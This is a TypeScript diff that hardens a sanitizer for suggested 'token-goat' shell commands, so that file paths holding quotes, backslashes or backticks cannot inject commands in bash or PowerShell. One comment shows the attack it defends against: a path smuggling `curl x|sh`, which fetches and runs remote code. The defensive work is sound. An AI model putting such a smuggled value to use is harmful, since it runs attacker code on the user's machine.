@@ -25,24 +25,35 @@ function suggestionIsUnsafe(slice: string): boolean {
   // Single quotes keep `$` and PowerShell's double quotes literal in both shells, which is why quotedArg chose them; only a character PowerShell reads as a single quote ends one early. Everywhere else `$` substitutes and U+201C-U+201E closes a double quote.
   if (scan.singleQuoted.some((body) => ENDS_SINGLE_QUOTES.test(body))) return true
   if ([...scan.gaps, ...scan.doubleQuoted].some((text) => text.includes('$') || POWERSHELL_DOUBLE_QUOTE.test(text))) return true
+  // Bash keeps `\"` inside double quotes, while PowerShell reads the backslash as itself and the quote as the end of the argument, so the two shells split the command in different places.
+  if (scan.doubleQuoted.some((body) => body.includes('\\"'))) return true
+  if ([...scan.singleQuoted, ...scan.doubleQuoted].some((body) => body.includes(UNQUOTABLE))) return true
   // Gap 0 is the command we wrote before the first quote, and quoted bodies are where a path legitimately contains almost anything. Every later gap is ground a path can only reach by escaping, so that is what has to look like something we would have written.
   return scan.gaps.slice(1).some((gap) => !SAFE_OUTSIDE_QUOTES.test(gap))
 }
 
 /** A suggestion read the way bash and PowerShell both read its quoting: `gaps` holds the text outside every quoted argument (gap 0 is what precedes the first), `singleQuoted` and `doubleQuoted` the bodies, and `open` the mark of an argument still open where the slice ends. Splitting on `"` alone read the `"` inside `token-goat outline 'a"b.ts'`, which {@link quotedArg} emits for a path holding a double quote, as an unclosed argument, and the relay dropped a command both shells run as written. */
-interface QuoteScan { gaps: string[]; singleQuoted: string[]; doubleQuoted: string[]; open: '"' | "'" | null }
+interface QuoteScan { gaps: string[]; singleQuoted: string[]; doubleQuoted: string[]; open: '"' | "'" | null; tick: number }
 
-/** Scan `slice` for its quoted arguments ({@link QuoteScan}). `"` always opens one; `'` opens one only after whitespace, since anywhere else it is the apostrophe in prose (`OCR'd`) and stays in its gap; inside either the other mark is literal. `insideSingle` starts the scan inside a single-quoted string that opened before the slice, for a `'` written right before `token-goat` (`spawnSync('token-goat hook ' + event)`): its next `'` closes that string rather than opening an argument. */
-function scanQuotes(slice: string, insideSingle = false): QuoteScan {
-  const scan: QuoteScan = { gaps: [], singleQuoted: [], doubleQuoted: [], open: null }
+/** Scan `slice` for its quoted arguments ({@link QuoteScan}). `"` always opens one; `'` opens one only after whitespace, since anywhere else it is the apostrophe in prose (`OCR'd`) and stays in its gap; inside either the other mark is literal. A backslash outside quotes takes the next character with it, as in bash, and so does one inside double quotes ({@link closingMark}): `"a\" b"` is one argument to bash, and splitting it at `\"` read a path that kept its quote open as one that closed. `insideSingle` starts the scan inside a single-quoted string that opened before the slice, for a `'` written right before `token-goat` (`spawnSync('token-goat hook ' + event)`): its next `'` closes that string rather than opening an argument. `stopAtTick` ends the scan at the first backtick outside every argument and records where (`tick`, -1 when there is none), which is where a fenced command closes. */
+function scanQuotes(slice: string, insideSingle = false, stopAtTick = false): QuoteScan {
+  const scan: QuoteScan = { gaps: [], singleQuoted: [], doubleQuoted: [], open: null, tick: -1 }
   let i = insideSingle ? slice.indexOf("'") + 1 : 0
   if (i === 0 && insideSingle) return scan
   let gapStart = i
   while (i < slice.length) {
     const mark = slice[i]
+    if (mark === '\\') {
+      i += 2
+      continue
+    }
+    if (stopAtTick && mark === '`') {
+      scan.tick = i
+      break
+    }
     if (mark === '"' || (mark === "'" && /\s/.test(slice[i - 1] ?? ' '))) {
       scan.gaps.push(slice.slice(gapStart, i))
-      const close = slice.indexOf(mark, i + 1)
+      const close = closingMark(slice, mark, i + 1)
       if (close === -1) {
         scan.open = mark
         return scan
@@ -54,8 +65,18 @@ function scanQuotes(slice: string, insideSingle = false): QuoteScan {
     }
     i++
   }
-  scan.gaps.push(slice.slice(gapStart))
+  scan.gaps.push(slice.slice(gapStart, Math.min(i, slice.length)))
   return scan
+}
+
+/** Where the argument `mark` opened closes, read the way bash reads it: nothing escapes inside single quotes, while inside double quotes a backslash takes the next character with it, so `\"` does not close the argument and `\\"` does. */
+function closingMark(slice: string, mark: '"' | "'", from: number): number {
+  if (mark === "'") return slice.indexOf("'", from)
+  for (let i = from; i < slice.length; i++) {
+    if (slice[i] === '\\') i++
+    else if (slice[i] === '"') return i
+  }
+  return -1
 }
 
 /** A single-quoted argument still open where the suggestion was cut, which only a backtick inside the value does: {@link quotedArg} single-quotes a value holding a backtick, both shells keep it literal there, but the backtick fencing the command closes on it, so `token-goat outline 'a`id`.ts'` reaches the model as the code span `token-goat outline 'a`, then `id` as bare text. The value cannot hold `'` (quotedArg double-quotes one that does), so the cut always leaves its quote open, a value opening on a space (`' a`) included. */
@@ -68,10 +89,23 @@ function holdsCommandSubstitution(line: string): boolean {
   return line.includes('$(')
 }
 
+/** What the emitter writes after a command's last quoted argument: nothing, or flags with an optional count (`--tail 50`, `-C 3`). */
+const TRAILING_FLAGS = /^(?: -{1,2}[A-Za-z][A-Za-z0-9-]*(?: [0-9]+)?)*$/
+
+/** Where the fenced suggestion at the start of `line` closes: the first backtick outside every quoted argument, or -1 when the quoting cannot place it. That is the command's own fence whenever no value holds the mark that wraps it, because the emitter escapes nothing ({@link quotedArg}): a single-quoted value never holds `'`, and a double-quoted value holds `"` only if it also holds a character that ends single quotes or a control character, which is why quotedArg could not single-quote it. So a line holding `"` together with one of those is the one case where a value's own `"` could close its argument early and the backtick found after it be the value's, leaving the rest of the value in the message as a fenced command of its own; there the caller cuts to the last backtick on the line, as it does when no backtick closes the command at all. */
+function fencedCommandEnd(line: string): number {
+  const scan = scanQuotes(line, false, true)
+  // A value written with no quotes at all has nothing to bound it, so a backtick in it reads as the fence: only a command ending on a quoted argument or a flag after one is placed (gap 0 opens on `token-goat`, which TRAILING_FLAGS never takes).
+  if (scan.tick === -1 || !TRAILING_FLAGS.test(scan.gaps[scan.gaps.length - 1] ?? '')) return -1
+  const tick = scan.tick
+  const region = line.slice(0, line.lastIndexOf('`'))
+  return region.includes('"') && (ENDS_SINGLE_QUOTES.test(region) || CONTROL_OR_BIDI.test(region)) ? -1 : tick
+}
+
 /** What replaces a suggestion that broke its quoting. Names no path, so nothing is runnable. */
 const OMITTED = 'token-goat (command omitted: the path contains shell metacharacters)'
 
-/** Every `token-goat …` suggestion in `text`, with the unsafe ones replaced by {@link OMITTED}. Where a suggestion ends is decided twice, because the obvious answer is wrong in exactly the case that matters. A suggestion is fenced in backticks, so it normally ends at the first backtick after `token-goat ` -- but a path holding a backtick closes the fence early, and cutting there would leave the rest of the path (backticks and all) sitting in the message as residue. So: measure to the first backtick and check that; if it is safe, emit it and move on, which is every ordinary hint and leaves them byte-identical. Only once a break is found does the removal widen, out to the last backtick on that line when the suggestion was fenced (to the line's end when it was not), taking the residue and any further suggestion on the same line with it. Nothing ever crosses a line break. The two-step exists so the widening cannot cost anything on healthy text. Widening first would flag a hint that merely mentions another command after its suggestion (`… or \`cat\``), since the wider slice would then contain that fence. */
+/** Every `token-goat …` suggestion in `text`, with the unsafe ones replaced by {@link OMITTED}. Where a suggestion ends is decided twice, because the obvious answer is wrong in exactly the case that matters. A suggestion is fenced in backticks, so it normally ends at the first backtick after `token-goat ` -- but a path holding a backtick closes the fence early, and cutting there would leave the rest of the path (backticks and all) sitting in the message as residue. So: measure to the first backtick and check that; if it is safe, emit it and move on, which is every ordinary hint and leaves them byte-identical. Only once a break is found is the end measured again, by the quoting this time: the removal runs to the first backtick outside every quoted argument ({@link fencedCommandEnd}), which takes the value's own backticks with it and leaves the prose and the commands after it on the line, each checked in turn. Cutting to the last backtick on the line instead turned a large-file deny for a path holding a backtick into one sentence, its size, its sampling advice and its edit commands all gone. Where the quoting cannot place the end, the removal still widens, out to the last backtick on that line when the suggestion was fenced (to the line's end when it was not), taking the residue and any further suggestion on the same line with it. Nothing ever crosses a line break. The two-step exists so the widening cannot cost anything on healthy text. Widening first would flag a hint that merely mentions another command after its suggestion (`… or \`cat\``), since the wider slice would then contain that fence. */
 export function stripUnsafeSuggestions(text: string): string {
   if (!text.includes('token-goat ')) return text
   let out = ''
@@ -89,6 +123,12 @@ export function stripUnsafeSuggestions(text: string): string {
     if (!(looksLikeSuggestion(narrow) && suggestionIsUnsafe(narrow)) && !singleQuoteLeftOpen(narrow, text[start - 1] === "'") && !holdsCommandSubstitution(line)) {
       out += narrow
       at = start + narrow.length
+      continue
+    }
+    const end = text[start - 1] === '`' ? fencedCommandEnd(line) : -1
+    if (end !== -1) {
+      out += OMITTED + '`'
+      at = start + end + 1
       continue
     }
     // Only a fenced suggestion has a closing backtick to stop at; in an unfenced one the last backtick is the path's own, and stopping there left the path's tail behind.
@@ -126,16 +166,29 @@ const REWRITTEN_IN_DOUBLE_QUOTES = /[$`"\u201C-\u201E]/
 /** What a single-quoted argument cannot hold: `'` or a character PowerShell reads as one (U+2018-U+201B) closes it, and neither shell has an escape inside single quotes that the other reads the same way. */
 const ENDS_SINGLE_QUOTES = /['\u2018-\u201B\r\n]/
 
-/** One argument of a suggested `token-goat …` command, quoted so bash and PowerShell both hand the command the value as written. Double quotes by default: the form {@link stripUnsafeSuggestions} checks, and the only form that keeps a path holding a space in one argument (`token-goat scope my proj/a.ts:12` ran as `scope my` plus three stray arguments and exited 1). A value holding `$`, a backtick or a double quote is single-quoted instead, which both shells keep literal: `symbol '$ref'` missed with `Try: token-goat semantic "$ref"`, which both shells ran as `semantic ""`. `!` and backslash stay out of that trigger: history expansion is off in the non-interactive shell a suggestion runs in, and single-quoting every backslash would change the form of every Windows path for nothing. A value that single quotes cannot hold either stays double-quoted. It escapes nothing: a value that would need escaping is the guard's to drop, not this function's to hide. */
+/** One argument of a suggested `token-goat …` command, quoted so bash and PowerShell both hand the command the value as written. Double quotes by default: the form {@link stripUnsafeSuggestions} checks, and the only form that keeps a path holding a space in one argument (`token-goat scope my proj/a.ts:12` ran as `scope my` plus three stray arguments and exited 1). A value holding `$`, a backtick or a double quote is single-quoted instead, which both shells keep literal: `symbol '$ref'` missed with `Try: token-goat semantic "$ref"`, which both shells ran as `semantic ""`. `!` and backslash stay out of that trigger: history expansion is off in the non-interactive shell a suggestion runs in, and single-quoting every backslash would change the form of every Windows path for nothing. A value that single quotes cannot hold either stays double-quoted, unless it also ends double quotes, when it is not written at all ({@link unquotable}). It escapes nothing: a value that would need escaping is the guard's to drop, not this function's to hide. */
 export function quotedArg(value: string): string {
+  if (unquotable(value)) return '"' + UNQUOTABLE + '"'
   if (REWRITTEN_IN_DOUBLE_QUOTES.test(value) && !ENDS_SINGLE_QUOTES.test(value) && !CONTROL_OR_BIDI.test(value)) return "'" + value + "'"
   return '"' + value + '"'
 }
 
+/** What a double-quoted argument ends on: `"`, or one of PowerShell's U+201C-U+201E. */
+const ENDS_DOUBLE_QUOTES = /["“-„]/
+
+/** A value that ends double quotes and cannot go in single quotes either, so no argument holds it: written as is, its own `"` closed the argument early, the rest of the value sat outside every quote, and a backtick in it closed the command's fence where the guard could not tell it from the real one (`"a'" `curl x|sh` "b.md"`). */
+function unquotable(value: string): boolean {
+  return ENDS_DOUBLE_QUOTES.test(value) && (ENDS_SINGLE_QUOTES.test(value) || CONTROL_OR_BIDI.test(value))
+}
+
+/** What {@link quotedArg} writes in place of an {@link unquotable} value: no quote mark, no backtick, nothing either shell substitutes, so the command it sits in keeps its shape, and {@link stripUnsafeSuggestions} drops that command on sight. */
+const UNQUOTABLE = '<a value no quote mark can hold>'
+
 /** Every argument of one suggested command, quoted with one mark: single quotes when {@link quotedArg} would single-quote any of them and all of them can hold single quotes, double quotes otherwise. A `"<base64>"` beside a single-quoted path puts a double quote into a command that holds `$` or a backtick, and {@link stripUnsafeSuggestions} then drops the whole command, path and all. */
 export function quotedArgs(...values: string[]): string[] {
-  const single = values.some((v) => REWRITTEN_IN_DOUBLE_QUOTES.test(v)) && values.every((v) => !ENDS_SINGLE_QUOTES.test(v) && !CONTROL_OR_BIDI.test(v))
-  return values.map((v) => (single ? "'" + v + "'" : '"' + v + '"'))
+  const held = values.map((v) => (unquotable(v) ? UNQUOTABLE : v))
+  const single = held.some((v) => REWRITTEN_IN_DOUBLE_QUOTES.test(v)) && held.every((v) => !ENDS_SINGLE_QUOTES.test(v) && !CONTROL_OR_BIDI.test(v))
+  return held.map((v) => (single ? "'" + v + "'" : '"' + v + '"'))
 }
 
 /** A whole suggested `token-goat …` command set in a sentence, backtick-fenced so the text after it is not read as part of it: {@link stripUnsafeSuggestions} ends a suggestion at the first backtick, while `use: token-goat symbol "x")` or `("token-goat doctor --repair" retries it too.)` ran on to the line's end and was dropped for the `)` it reached outside the quotes. */
@@ -143,7 +196,7 @@ export function fencedCommand(command: string): string {
   return '`' + command + '`'
 }
 
-/** The one shape a deny or hint naming a file slice takes: the runnable command first, backtick-fenced with its argument double-quoted (the form {@link stripUnsafeSuggestions} checks, and the form hint_target.ts's sharpenRepeatedDeny lifts back out), then what it returns, then why the hook spoke. After a deny the next call was the named command 4 times in 39 sampled transcripts; a command buried behind the explanation is read last. A reason holding a backtick goes on its own line, because a suggestion the guard above drops is cut out to the last backtick on its line: on the same line, "`cat` loads the entire file into context." lost everything up to its own fence and read "Run `token-goat (command omitted: ...)` loads the entire file into context." A reason with no backtick stays on the line, where the guard cannot reach it, so a one-line hint stays one line (tests/guards/hook_hint_path_injection.test.ts holds the edit hint to no line breaks at all). */
+/** The one shape a deny or hint naming a file slice takes: the runnable command first, backtick-fenced with its argument double-quoted (the form {@link stripUnsafeSuggestions} checks, and the form hint_target.ts's sharpenRepeatedDeny lifts back out), then what it returns, then why the hook spoke. After a deny the next call was the named command 4 times in 39 sampled transcripts; a command buried behind the explanation is read last. A reason holding a backtick goes on its own line, because a suggestion the guard above drops is cut out to the last backtick on its line wherever the quoting cannot place the command's own fence: on the same line, "`cat` loads the entire file into context." lost everything up to its own fence and read "Run `token-goat (command omitted: ...)` loads the entire file into context." A reason with no backtick stays on the line, where the guard cannot reach it, so a one-line hint stays one line (tests/guards/hook_hint_path_injection.test.ts holds the edit hint to no line breaks at all). */
 export function leadWithCommand(command: string, purpose = '', reason = ''): string {
   const tail = reason.trim()
   return 'Run ' + fencedCommand(command) + (purpose === '' ? '' : ' ' + purpose) + '.' + (tail === '' ? '' : (tail.includes('`') ? '\n' : ' ') + tail)
